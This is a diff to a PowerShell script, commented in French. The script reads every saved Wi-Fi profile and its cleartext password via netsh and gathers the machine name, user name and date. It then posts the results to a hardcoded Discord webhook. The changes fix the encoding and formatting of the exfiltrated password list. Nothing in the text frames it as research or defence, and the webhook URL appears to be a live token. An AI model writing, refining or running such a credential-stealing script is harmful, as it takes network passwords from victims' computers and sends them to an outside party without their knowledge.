@@ -1,5 +1,8 @@
 $webhookUrl = "https://discord.com/api/webhooks/1501460061439004732/fE-P3g0HI2ha_ZKMhWmn1woNkl8yzMz_sLLFffMnk4xa1JtNDy0PodilxIiB7BlEvS_m"
 
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$OutputEncoding = [System.Text.Encoding]::UTF8
+
 $results = @()
 
 $profiles = netsh wlan show profiles |
@@ -24,19 +27,24 @@ $date        = Get-Date -Format "yyyy-MM-dd HH:mm"
 
 $lignes = $results | ForEach-Object { "- $($_.SSID) : $($_.Password)" }
 $texte  = $lignes -join "`n"
+$texteEchappe = $texte.Replace('"', '\"').Replace("`n", '\n').Replace("`r", '')
+$remplacement = '"```\n' + $texteEchappe + '\n```"'
 
 $payload = [ordered]@{
     embeds   = @(@{
         title  = "Nouvelle entrée"
+        color  = 3447003
         fields = @(
             @{ name = "Machine";     value = $machine;     inline = $true  }
             @{ name = "Utilisateur"; value = $utilisateur; inline = $true  }
             @{ name = "Date";        value = $date;        inline = $false }
-            @{ name = "SSID / Password";        value = $texte;       inline = $false }
+            @{ name = "SSID / Mot de passe";        value = "PLACEHOLDER"; inline = $false }
         )
     })
 }
 
-$body = $payload | ConvertTo-Json -Depth 5 -Compress
+$json  = $payload | ConvertTo-Json -Depth 5 -Compress
+$body  = $json -replace '"PLACEHOLDER"', $remplacement
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json; charset=utf-8"
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
